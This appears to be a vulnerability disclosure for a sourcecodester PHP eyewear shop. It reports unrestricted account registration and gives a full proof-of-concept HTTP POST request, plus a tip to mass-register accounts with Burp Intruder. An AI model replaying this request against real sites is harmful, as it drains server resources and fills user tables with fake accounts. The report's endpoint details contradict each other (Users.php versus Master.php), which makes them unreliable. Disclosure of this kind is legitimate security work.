## Online eyewear store website has pi liang hu vulnerability

## Affected version: 
Online Eyewear Shop Website - 1.0

## Software:
https://www.sourcecodester.com/php/16089/online-eyewear-shop-website-using-php-and-mysql-free-download.html

## Vulnerability File:
/oews/classes/Users.php?f=registration

## Description:
The online eyewear store website 1.0 has an arbitrary user registration vulnerability in /oews/classes/Master.php?f=save_product. The attack parameter is email. 
As long as the emails are different, any number of accounts can be registered without restriction, resulting in server resource occupation.

Status: Moderate

POC
```
POST /oews/classes/Users.php?f=registration HTTP/1.1
Host: localhost
Content-Length: 976
sec-ch-ua: "(Not(A:Brand";v="8", "Chromium";v="101"
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryarM6jeK1Qyv2eVDa
X-Requested-With: XMLHttpRequest
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36
sec-ch-ua-platform: "Windows"
Origin: http://localhost
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost/oews/register.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=p65p1sp36htfqevfnhij1jvtie
Connection: close

------WebKitFormBoundaryarM6jeK1Qyv2eVDa
Content-Disposition: form-data; name="id"


------WebKitFormBoundaryarM6jeK1Qyv2eVDa
Content-Disposition: form-data; name="firstname"

test
------WebKitFormBoundaryarM6jeK1Qyv2eVDa
Content-Disposition: form-data; name="middlename"

test
------WebKitFormBoundaryarM6jeK1Qyv2eVDa
Content-Disposition: form-data; name="lastname"

test
------WebKitFormBoundaryarM6jeK1Qyv2eVDa
Content-Disposition: form-data; name="gender"

Male
------WebKitFormBoundaryarM6jeK1Qyv2eVDa
Content-Disposition: form-data; name="email"

admi@qq2.com
------WebKitFormBoundaryarM6jeK1Qyv2eVDa
Content-Disposition: form-data; name="contact"

123
------WebKitFormBoundaryarM6jeK1Qyv2eVDa
Content-Disposition: form-data; name="password"

admin123
------WebKitFormBoundaryarM6jeK1Qyv2eVDa
Content-Disposition: form-data; name="img"; filename=""
Content-Type: application/octet-stream


------WebKitFormBoundaryarM6jeK1Qyv2eVDa--
```

Batch user registration can be performed through the Intruder module of burp
![CleanShot 2025-04-03 at 12 55 26@2x](https://github.com/user-attachments/assets/edd9c369-9933-4904-95bb-cb153f565e8b)
![CleanShot 2025-04-03 at 12 56 43@2x](https://github.com/user-attachments/assets/da4623a4-3f98-4e86-b8f6-abc78da95627)
![CleanShot 2025-04-03 at 12 57 08@2x](https://github.com/user-attachments/assets/c27f1c9d-e046-4022-9e91-4a9b19fd2ed4)





